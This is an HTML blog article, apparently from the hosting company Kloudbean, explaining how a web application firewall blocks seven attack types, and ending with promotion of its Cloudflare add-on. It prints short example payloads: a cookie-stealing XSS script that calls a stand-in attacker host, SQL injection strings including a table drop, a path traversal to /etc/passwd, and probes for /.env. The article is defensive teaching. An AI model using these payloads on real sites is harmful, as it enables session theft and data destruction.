@@ -1,0 +1,177 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>What a WAF Does: 7 Attacks a Web Application Firewall Blocks</title>
+<meta name="description" content="What a WAF does, in plain terms: it reads every HTTP request and drops the malicious ones before they hit your app. Here are 7 real attacks a web application firewall blocks, and the honest limits.">
+<meta name="author" content="Kloudbean">
+<link rel="canonical" href="https://www.kloudbean.com/blog/what-a-waf-does/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="What a WAF Does: 7 Attacks a Web Application Firewall Blocks">
+<meta property="og:description" content="A WAF inspects HTTP requests and blocks SQL injection, XSS, path traversal, bad bots, and more before they reach your code. What it catches, and what it can't.">
+<meta property="og:image" content="images/hero.png">
+<meta property="og:site_name" content="Kloudbean">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/article.css">
+</head>
+<body>
+<article class="wrap">
+  <span class="eyebrow">Security &amp; scaling</span>
+  <h1>What a WAF Does: 7 Attacks a Web Application Firewall Blocks</h1>
+
+  <figure><img src="images/hero.png" alt="What a web application firewall actually blocks: seven real threats"></figure>
+
+  <p class="lead">Picture a bouncer at the door of your app. Every request that wants in gets a quick look, and the ones carrying something nasty get turned away before they reach your code. That's what a <strong>WAF</strong> does. A web application firewall sits in front of your application, reads each incoming HTTP request, and drops the malicious ones.</p>
+
+  <p>"It blocks bad traffic" is true but useless, so let's get specific. Here are seven real attacks a WAF actually stops, with the kind of request each one looks like, then the honest part about what a WAF can't do on its own. Because it isn't a magic shield, and I'd rather you deploy it knowing that.</p>
+
+  <div class="tldr">
+    <strong>Short version</strong>
+    <p>A WAF is a filter in front of your app that inspects HTTP requests and blocks ones matching known attack patterns: SQL injection, XSS, path traversal, bad bots, credential stuffing, exploit probes, and malformed payloads. It runs at the edge, before traffic reaches your origin. It's a strong layer, not a replacement for secure code and patching, and you should run it in monitor mode first so it doesn't block your own users.</p>
+  </div>
+
+  <h2>What a web application firewall actually is (and how it differs from a firewall)</h2>
+  <p>A WAF is a security layer positioned in front of your application, at the edge or on the server, that reads each request and checks it against a set of rules. Legitimate requests pass through untouched. Requests that match known attack patterns get blocked with something like a <code>403 Forbidden</code> before your app ever sees them.</p>
+  <p>The word "firewall" trips people up, because a WAF is a different animal from the network firewall you already know. A network firewall works at the connection level (layer 3 and 4): it decides which ports and IP addresses can talk to your server at all. It has no idea what's <em>in</em> the traffic it lets through. A WAF works at the application level (layer 7): it reads the actual HTTP request, the URL, the headers, the body, and judges the content. Network firewall guards which doors are open. The WAF reads what each visitor is carrying through them. You want both.</p>
+
+  <figure>
+    <svg viewBox="0 0 720 320" width="100%" role="img" aria-label="Diagram of a web application firewall. Two requests arrive from the left. A clean request, GET /products?id=42, passes through the WAF and reaches your app. A malicious request, GET /products?id=1 OR 1 equals 1, a SQL injection attempt, is stopped at the WAF and blocked with a 403, never reaching the app.">
+      <rect x="1" y="1" width="718" height="318" rx="16" fill="#fff" stroke="#e6e9f2"/>
+      <text x="360" y="34" text-anchor="middle" font-family="Poppins,Arial,sans-serif" font-size="16" font-weight="700" fill="#000f27">The WAF reads each request and drops the bad one</text>
+
+      <g font-family="Poppins,Arial,sans-serif">
+        <!-- clean request -->
+        <rect x="18" y="74" width="256" height="52" rx="8" fill="#eaf7ef" stroke="#cdebd6"/>
+        <text x="34" y="98" font-size="12" font-weight="600" fill="#000f27">Clean request</text>
+        <text x="34" y="116" font-size="12" fill="#5b6a86">GET /products?id=42</text>
+
+        <!-- malicious request -->
+        <rect x="18" y="194" width="256" height="54" rx="8" fill="#fdeaea" stroke="#f5c2c2"/>
+        <text x="34" y="216" font-size="12" fill="#000f27">GET /products?id=1' OR '1'='1</text>
+        <text x="34" y="234" font-size="11" fill="#b4363b">SQL injection attempt</text>
+
+        <!-- WAF bar -->
+        <rect x="330" y="58" width="72" height="204" rx="10" fill="#efeaff" stroke="#d7ccff"/>
+        <text x="366" y="150" text-anchor="middle" font-size="15" font-weight="700" fill="#4F1AF3">WAF</text>
+        <text x="366" y="170" text-anchor="middle" font-size="10.5" fill="#5b6a86">inspects HTTP</text>
+
+        <!-- app box -->
+        <rect x="520" y="72" width="180" height="64" rx="10" fill="#fff" stroke="#000f27" stroke-width="1.5"/>
+        <text x="610" y="100" text-anchor="middle" font-size="13" font-weight="600" fill="#000f27">Your app</text>
+        <text x="610" y="120" text-anchor="middle" font-size="11" fill="#5b6a86">(origin)</text>
+
+        <!-- clean path (green) -->
+        <line x1="274" y1="100" x2="330" y2="100" stroke="#40b75f" stroke-width="2"/>
+        <line x1="402" y1="100" x2="512" y2="104" stroke="#40b75f" stroke-width="2"/><polygon points="512,99 523,104 511,109" fill="#40b75f"/>
+        <text x="455" y="92" text-anchor="middle" font-size="10.5" fill="#40b75f">passes</text>
+
+        <!-- malicious path (red), blocked at WAF -->
+        <line x1="274" y1="220" x2="330" y2="220" stroke="#e5484d" stroke-width="2"/>
+        <circle cx="416" cy="220" r="13" fill="#e5484d"/>
+        <line x1="410" y1="214" x2="422" y2="226" stroke="#fff" stroke-width="2"/>
+        <line x1="422" y1="214" x2="410" y2="226" stroke="#fff" stroke-width="2"/>
+        <text x="416" y="250" text-anchor="middle" font-size="10.5" fill="#b4363b">403 blocked</text>
+
+        <text x="366" y="284" text-anchor="middle" font-size="11" fill="#5b6a86">checks: SQLi · XSS · path traversal · bad bots</text>
+      </g>
+    </svg>
+    <figcaption>Same endpoint, two requests. The WAF waves the clean one through and drops the injection attempt before your app runs a single query.</figcaption>
+  </figure>
+
+  <h2>The 7 attacks a WAF blocks</h2>
+
+  <h3>1. SQL injection</h3>
+  <p>A request tries to smuggle database commands into a form field or URL, hoping your app hands them straight to the database. A classic looks like <code>?id=1' OR '1'='1</code> or a sneaky <code>'; DROP TABLE users;--</code>. Left unchecked, it can dump or wreck your data. The WAF recognizes the tell-tale SQL syntax showing up where a plain value should be and blocks it at the door. It's one of the oldest, most damaging web attacks, and it's still everywhere.</p>
+
+  <h3>2. Cross-site scripting (XSS)</h3>
+  <p>A request tries to inject JavaScript into your pages so it runs in other visitors' browsers, stealing sessions or defacing content. Think a comment field stuffed with <code>&lt;script&gt;fetch('//evil.tld?c='+document.cookie)&lt;/script&gt;</code>. The WAF spots script-injection patterns in the request and drops them before the payload is ever stored or reflected. Pair it with a <a href="https://www.kloudbean.com/blog/security-headers-guide/">Content-Security-Policy header</a> and you've got real layered defense against the XSS family.</p>
+
+  <h3>3. Path traversal and file access</h3>
+  <p>A request tries to climb out of the web root to read files it shouldn't, using sequences like <code>../../../etc/passwd</code> to reach system files or app config. The WAF recognizes the traversal pattern and rejects it. This one pairs closely with exploit probing below, since scanners love to spray these at any URL that takes a filename.</p>
+
+  <h3>4. Bad bots and scrapers</h3>
+  <p>Automated bots hammer your site: scraping content wholesale, hunting for weak spots, burning your resources at scale. A WAF fingerprints non-human, abusive traffic and blocks or challenges it, so your server spends its cycles on real visitors. Not every bot is the enemy (you want Googlebot), and a decent WAF tells the useful crawlers apart from the abusive ones.</p>
+
+  <h3>5. Credential stuffing and brute force</h3>
+  <p>Bots fire thousands of username and password combinations at your login, often reusing credentials leaked from some other breach. Through rate-limiting, the WAF notices one source flooding your login endpoint and throttles or blocks it long before it guesses right. This pairs with app-level protection like multi-factor auth for a login that's genuinely hard to crack.</p>
+
+  <h3>6. Known exploit probes</h3>
+  <p>A huge share of internet background noise is automated scanners poking for known-vulnerable paths: requesting <code>/wp-admin</code> tricks, hitting old plugin URLs, and probing for <code>/.env</code> or <code>/.git/config</code> hoping you left secrets exposed. The WAF recognizes these scan patterns and the signatures of known exploits and quietly absorbs them, so the noise never reaches your app.</p>
+
+  <h3>7. Malformed payloads and upload tricks</h3>
+  <p>The catch-all: requests carrying deliberately malformed data, oversized inputs, or files disguised to slip past your app and execute something they shouldn't. The WAF inspects payloads for these signatures and rejects them, adding a checkpoint between the raw request and your logic. It flags a range of "this request is clearly up to no good" cases you'd otherwise defend against one by one.</p>
+
+  <!-- swap this slot for a real screenshot: src -> images/your-file.png -->
+  <figure class="img-slot"><span><b>Add image</b><em>An access log or WAF event feed with blocked probes: requests for /.env, /wp-admin, and a SQL-injection string, each marked 403.</em><small>Real log lines make the "background noise" concrete.</small></span></figure>
+
+  <h2>Managed rules versus custom rules</h2>
+  <p>You mostly don't write WAF rules from scratch, and that's the point. Most WAFs ship with a maintained ruleset built on the <strong>OWASP Core Rule Set (CRS)</strong>, the widely used open standard (the engine behind a lot of it is <strong>ModSecurity</strong>). Those rules already cover the seven categories above and get updated as new attack patterns emerge, so you benefit without becoming a security researcher.</p>
+  <p>Custom rules are for the things only you know: block a country you never sell to, rate-limit a specific expensive endpoint, allow-list your office IP for the admin panel. Start with the managed ruleset, add custom rules only where your app has a specific need. Over-customizing early is a great way to create false positives you'll spend weeks chasing.</p>
+
+  <!-- swap this slot for a real screenshot: src -> images/your-file.png -->
+  <figure class="img-slot"><span><b>Add image</b><em>A WAF events dashboard: blocked requests by rule (SQLi, XSS, bad bots) over the last 24 hours.</em><small>Seeing the volume of junk it absorbs is the moment a WAF sells itself.</small></span></figure>
+
+  <h2>The honest downside: false positives</h2>
+  <p>A WAF's weakness is the flip side of its strength. It matches patterns, and sometimes a legitimate request looks like an attack. A user pastes a code snippet with <code>&lt;script&gt;</code> in it into your support form. Your own API sends a payload that trips a rule. Suddenly real people are getting blocked, and the reports land on you.</p>
+  <p>So here's the rule I'd stand behind: never flip a WAF straight to blocking on day one. Run it in <strong>monitor or log mode</strong> first, watch what it <em>would</em> have blocked for a week or two, tune out the false positives, and only then switch to enforce. The anti-pattern we see over and over is someone enabling an aggressive WAF, walking away, and then wondering why their own dashboard or checkout is throwing 403s. Monitor first. Enforce second. Your users will never know it happened.</p>
+
+  <!-- swap this slot for a real screenshot: src -> images/your-file.png -->
+  <figure class="img-slot"><span><b>Add image</b><em>A WAF rule in monitor or log-only mode, showing what it would have blocked before you switch it to enforce.</em><small>The safe rollout step, in one picture.</small></span></figure>
+
+  <h2>A WAF is a layer, not a fix</h2>
+  <p>Now the caveat that matters most, because a WAF is not a force field. It blocks <em>known patterns</em>, so a clever novel attack can slip past it, and it absolutely does not excuse sloppy code. If your app builds SQL by string-concatenating user input, a WAF is a band-aid over a wound that needs stitches. Use parameterized queries. Validate input. Keep your software patched. The WAF's real job is soaking up the enormous volume of common, automated junk at the door, which is genuinely valuable and takes real load off you, while your secure code handles the requests that look legitimate but aren't.</p>
+  <p>Think defense in depth. A WAF sits alongside <a href="https://www.kloudbean.com/blog/ddos-protection-explained/">DDoS protection</a> at the edge, <a href="https://www.kloudbean.com/blog/security-headers-guide/">security headers</a> in the browser, and clean images from <a href="https://www.kloudbean.com/blog/container-security-scanning/">container scanning</a>. Anyone telling you a WAF alone makes you safe is overselling. Anyone skipping a WAF because "it's not perfect" is leaving an easy, high-value layer on the table.</p>
+
+  <h2>Where a WAF fits on Kloudbean</h2>
+  <p>Straight answer, because the accuracy matters here: Kloudbean doesn't run a WAF baked into the box. The WAF layer is delivered by the <strong>Cloudflare Enterprise add-on</strong>, which is paid on standard plans and included free for Enterprise accounts. It sits at the edge, in front of your origin, and screens layer-7 requests against a maintained ruleset before they reach you. Underneath that, on the server itself, the baseline is a <strong>Shorewall firewall plus Fail2ban</strong>, which closes unused ports and bans addresses that keep misbehaving. So the picture is layered: Cloudflare's WAF at the edge, Shorewall and Fail2ban on the origin, and your secure code behind both. That mirrors how the edge handles floods too, which we cover in <a href="https://www.kloudbean.com/blog/ddos-protection-explained/">DDoS protection explained</a>, and it's the same defense-in-depth story as <a href="https://www.kloudbean.com/blog/secure-wordpress-hosting/">secure WordPress hosting</a>.</p>
+
+  <div class="cta">
+    <p style="margin:0 0 .4em; font-weight:600; font-size:20px">A bouncer at the door, a sound building behind it.</p>
+    <p style="margin:0">Run your app on a managed stack with an edge WAF add-on and a hardened origin at <a href="https://www.kloudbean.com/">kloudbean.com</a>. Cloudflare Enterprise edge add-on · Shorewall + Fail2ban baseline · Free SSL · Managed patching · Automatic backups · Free trial. Plans on <a href="https://www.kloudbean.com/pricing/">pricing</a>.</p>
+  </div>
+
+  <h2>FAQ</h2>
+  <div class="faq">
+    <h3>What does a WAF do?</h3>
+    <p>A web application firewall sits in front of your app and inspects each incoming HTTP request against a set of rules, blocking the ones that match known attack patterns while letting legitimate traffic through. In plain terms, it reads what each request is trying to do and drops the malicious ones before they reach your code, catching the large volume of common automated attacks at the door.</p>
+    <h3>What attacks does a WAF block?</h3>
+    <p>Common ones include SQL injection, cross-site scripting (XSS), path traversal, abusive bots and scrapers, credential stuffing and brute-force logins (via rate-limiting), automated probes for known vulnerabilities like requests for /.env or /wp-admin, and requests carrying malformed or oversized payloads. It handles the bulk of common, automated attacks before they reach your application code.</p>
+    <h3>How is a WAF different from a network firewall?</h3>
+    <p>A network firewall works at layers 3 and 4: it filters by port and IP address and decides which connections are allowed at all, without inspecting the content. A WAF works at layer 7: it reads the actual HTTP request (URL, headers, body) and blocks ones that look like attacks such as SQL injection or XSS. They protect different layers and are typically used together.</p>
+    <h3>Is a WAF enough to secure my app?</h3>
+    <p>No. It's one layer, not the whole solution. A WAF blocks known attack patterns and takes real load off you, but it can miss novel attacks and doesn't replace writing secure code (parameterized queries, input validation) or keeping software patched. Use it as part of defense in depth alongside those practices, not instead of them.</p>
+    <h3>What is the OWASP Core Rule Set?</h3>
+    <p>The OWASP Core Rule Set (CRS) is a widely used, open set of WAF rules that detect common attacks like SQL injection and XSS. Many WAFs ship it (or something based on it) as their default managed ruleset, often on the ModSecurity engine, and keep it updated as new attack patterns appear. It means you get broad protection without writing rules yourself.</p>
+    <h3>Will a WAF block legitimate users by mistake?</h3>
+    <p>It can, and that's the main downside. Because a WAF matches patterns, a legitimate request that happens to look like an attack (say a user pasting code with a script tag into a form) can get blocked. The fix is to run the WAF in monitor or log mode first, watch what it would block, tune out the false positives, and only then switch to enforcing.</p>
+    <h3>Does a WAF replace secure coding and patching?</h3>
+    <p>No. A WAF is a safety net over your app, not a substitute for building it securely. If your code concatenates user input into SQL, a WAF only papers over the real flaw. Use parameterized queries, validate input, and keep software patched. The WAF's job is to absorb the flood of automated attacks so your secure code can focus on the requests that look legitimate but aren't.</p>
+    <h3>Do I have to configure a WAF myself?</h3>
+    <p>Usually not much. A WAF ships with a maintained ruleset (commonly based on the OWASP Core Rule Set) that covers common attacks out of the box, so you benefit without writing rules. You can add custom rules for your specific needs, like rate-limiting one endpoint or allow-listing your admin IP, but the defaults already block the bulk of automated attacks.</p>
+    <h3>Does Kloudbean include a WAF?</h3>
+    <p>The WAF on Kloudbean is delivered through the Cloudflare Enterprise add-on, which is paid on standard plans and included free for Enterprise accounts. It runs at the edge in front of your origin and screens layer-7 requests against a maintained ruleset. On the server itself, a Shorewall firewall and Fail2ban form the baseline, so you get edge filtering plus a hardened origin, with your secure code behind both.</p>
+  </div>
+
+  <p class="byline">Kloudbean · The bouncer at your app's door.</p>
+</article>
+
+<script type="application/ld+json">
+{"@context":"https://schema.org","@graph":[
+{"@type":"Article","headline":"What a WAF Does: 7 Attacks a Web Application Firewall Blocks","description":"A WAF inspects HTTP requests and blocks SQL injection, XSS, path traversal, bad bots, and more before they reach your code. What it catches, and what it can't.","image":"https://www.kloudbean.com/blog/what-a-waf-does/images/hero.png","author":{"@type":"Organization","name":"Kloudbean","url":"https://www.kloudbean.com/"},"publisher":{"@type":"Organization","name":"Kloudbean","logo":{"@type":"ImageObject","url":"https://www.kloudbean.com/logo.png"}},"mainEntityOfPage":"https://www.kloudbean.com/blog/what-a-waf-does/"},
+{"@type":"FAQPage","mainEntity":[
+{"@type":"Question","name":"What does a WAF do?","acceptedAnswer":{"@type":"Answer","text":"A web application firewall sits in front of your app and inspects each incoming HTTP request against a set of rules, blocking the ones that match known attack patterns while letting legitimate traffic through. In plain terms, it reads what each request is trying to do and drops the malicious ones before they reach your code, catching the large volume of common automated attacks at the door."}},
+{"@type":"Question","name":"What attacks does a WAF block?","acceptedAnswer":{"@type":"Answer","text":"Common ones include SQL injection, cross-site scripting (XSS), path traversal, abusive bots and scrapers, credential stuffing and brute-force logins (via rate-limiting), automated probes for known vulnerabilities like requests for /.env or /wp-admin, and requests carrying malformed or oversized payloads. It handles the bulk of common, automated attacks before they reach your application code."}},
+{"@type":"Question","name":"How is a WAF different from a network firewall?","acceptedAnswer":{"@type":"Answer","text":"A network firewall works at layers 3 and 4: it filters by port and IP address and decides which connections are allowed at all, without inspecting the content. A WAF works at layer 7: it reads the actual HTTP request (URL, headers, body) and blocks ones that look like attacks such as SQL injection or XSS. They protect different layers and are typically used together."}},
+{"@type":"Question","name":"Is a WAF enough to secure my app?","acceptedAnswer":{"@type":"Answer","text":"No. It's one layer, not the whole solution. A WAF blocks known attack patterns and takes real load off you, but it can miss novel attacks and doesn't replace writing secure code (parameterized queries, input validation) or keeping software patched. Use it as part of defense in depth alongside those practices, not instead of them."}},
+{"@type":"Question","name":"What is the OWASP Core Rule Set?","acceptedAnswer":{"@type":"Answer","text":"The OWASP Core Rule Set (CRS) is a widely used, open set of WAF rules that detect common attacks like SQL injection and XSS. Many WAFs ship it (or something based on it) as their default managed ruleset, often on the ModSecurity engine, and keep it updated as new attack patterns appear. It means you get broad protection without writing rules yourself."}},
+{"@type":"Question","name":"Will a WAF block legitimate users by mistake?","acceptedAnswer":{"@type":"Answer","text":"It can, and that's the main downside. Because a WAF matches patterns, a legitimate request that happens to look like an attack (say a user pasting code with a script tag into a form) can get blocked. The fix is to run the WAF in monitor or log mode first, watch what it would block, tune out the false positives, and only then switch to enforcing."}},
+{"@type":"Question","name":"Does a WAF replace secure coding and patching?","acceptedAnswer":{"@type":"Answer","text":"No. A WAF is a safety net over your app, not a substitute for building it securely. If your code concatenates user input into SQL, a WAF only papers over the real flaw. Use parameterized queries, validate input, and keep software patched. The WAF's job is to absorb the flood of automated attacks so your secure code can focus on the requests that look legitimate but aren't."}},
+{"@type":"Question","name":"Do I have to configure a WAF myself?","acceptedAnswer":{"@type":"Answer","text":"Usually not much. A WAF ships with a maintained ruleset (commonly based on the OWASP Core Rule Set) that covers common attacks out of the box, so you benefit without writing rules. You can add custom rules for your specific needs, like rate-limiting one endpoint or allow-listing your admin IP, but the defaults already block the bulk of automated attacks."}},
+{"@type":"Question","name":"Does Kloudbean include a WAF?","acceptedAnswer":{"@type":"Answer","text":"The WAF on Kloudbean is delivered through the Cloudflare Enterprise add-on, which is paid on standard plans and included free for Enterprise accounts. It runs at the edge in front of your origin and screens layer-7 requests against a maintained ruleset. On the server itself, a Shorewall firewall and Fail2ban form the baseline, so you get edge filtering plus a hardened origin, with your secure code behind both."}}
+]}
+]}
+</script>
+</body>
+</html>
